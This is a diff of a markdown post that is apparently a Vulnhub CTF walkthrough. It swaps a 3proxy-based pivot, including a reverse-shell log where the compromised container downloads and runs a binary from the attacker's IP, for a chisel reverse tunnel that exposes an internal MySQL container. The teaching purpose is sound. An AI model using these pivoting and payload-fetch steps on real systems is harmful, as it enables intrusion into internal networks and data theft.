@@ -252,74 +252,65 @@ harborbank_mysql_1.harborbank_backend (172.20.0.138) at 02:42:ac:14:00:8a [ether
 
 ```
 
-**Privilege escalation? No! Let's just pivot**
+**Privilege escalation? No! Let's just ~~pivot~~ reverse pivot**
 
-
-```
-docker pull alpine
-sudo docker run -it --rm alpine /bin/sh
-apk add --no-cache build-base
-wget https://github.com/z3APA3A/3proxy/archive/devel.zip
-unzip devel.zip 
-cd 3proxy-devel
-make Makefile.Linux
-
-On your host machine:
-docker cp 48b2378a0e01:/home/3proxy-devel/bin/3proxy ./
+How do I tunnel my traffic through the host VM? I could open a listening port on the docker container but the host VM would not let my traffic through (corporate firewalls?) I could very well use a meterpreter PHP payload and let metasploit handle the proxying for me. But I said I would try new tools and techniques to solve this challenge.
 
 ```
-
-Config file:
-
-```
-log /tmp/3proxy.log D
-
-external 0.0.0.0
-
-internal 0.0.0.0
-
-auth none
-
-flush
-
-proxy -p3128 -n
-
-flush
-
-socks -p1080
-```
-
+          22  <---> 
+[Host VM]              80:[Docker Container running PHP]:(higher order port--->  8000:[Attacker Machine]
+          80  <--->                                      reverse connect)
+                                  ^
+                                  | 
+                                  |
+                                  v  
+                        [Docker Container running MySQL]:3306
 
 ```
-root@kali:~# nc -lvvp 8888
-listening on [any] 8888 ...
-192.168.1.21: inverse host lookup failed: Unknown host
-connect to [192.168.1.22] from (UNKNOWN) [192.168.1.21] 35046
-Linux 707af7b0d61f 4.15.0-65-generic #74-Ubuntu SMP Tue Sep 17 17:06:04 UTC 2019 x86_64 Linux
-sh: w: not found
-uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
-/bin/sh: can't access tty; job control turned off
-/ $ wget http://192.168.1.22/3proxy
-Connecting to 192.168.1.22 (192.168.1.22:80)
-wget: can't open '3proxy': Permission denied
-/ $ cd /tmp      
-/tmp $ wget http://192.168.1.22/3proxy_alp
-Connecting to 192.168.1.22 (192.168.1.22:80)
-3proxy_alp           100% |*******************************|  1067k  0:00:00 ETA
 
-/tmp $ chmod +x 3proxy_alp
-/tmp $ wget http://192.168.1.22/config.cfg
-Connecting to 192.168.1.22 (192.168.1.22:80)
-wget: can't open 'config.cfg': File exists
-/tmp $ ls
-3proxy_alp
-config.cfg
-lincheck.sh
-p
-sess_acb58e455065ff339e002533dda99949
-/tmp $ ./3proxy_alp config.cfg
+In situations where there are no SSH or other ways to tunnel the traffic, we could use reverse pivot. The victim machine (client) will connect back to the attacker machine (server) and then open a tunnel to route the traffic to the destination server and port. Let me illustrate:
 
 ```
+          | :22  <--->                                                              |
+[Host VM] |               80:[Docker Container running PHP]:(higher order port <--->| 8000:(netcat)
+          |                                                 reverse connect)        |        
+          | :80  <--->                                      :(chisel reverse        |     [Attacker Machine]
+                                                            connect to 8888) <--->  |
+                                                                                    | 8888:(chisel server listening)
+                                  ^          172.20.0.138:3306 |                    |            |
+                                  |                            |                                 v
+                                  | <--------------------------|                             9999:127.0.0.1 (connect via mysql)
+                                  v  
+                        [Docker Container running MySQL]:3306
+
+```
+
+There are quite a lot of tools that comes to my mind for such a situation. Listing them below for your reference:
+
+* [3proxy](https://github.com/z3APA3A/3proxy)
+* [rpivot](https://github.com/klsecservices/rpivot)
+* [reGeorg](https://github.com/sensepost/reGeorg)
+
+Out of the many lot I chose to go with [Chisel](https://github.com/jpillora/chisel#socks5-guide), mainly because of it's simplicity, written in golang and can be cross-compiled. 
+
+**On the victim machine run:**
+
+```sh
+./chisel client 192.168.1.22:8888 R:9999:172.20.0.138:3306
+```
+
+![chisel_command](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_4.png)
+
+**On the attacker machine run**
+```sh
+/chisel_linux_amd64 server -p 8888 -reverse 
+```
+
+![chisel_listening_server](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_3.gif)
+
+Now, let's go ahead and connect to MySQL and see what's in the database for us:
+
+![mysql_connect](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_2.gif)
 
 
 There should be whitespace between paragraphs.
@@ -437,3 +428,6 @@ Long, single-line code blocks should not wrap. They should horizontally scroll i
 ```
 The final element.
 ```
+
+References:
+- A Red Teamer's guide to pivoting](https://artkond.com/2017/03/23/pivoting-guide/)
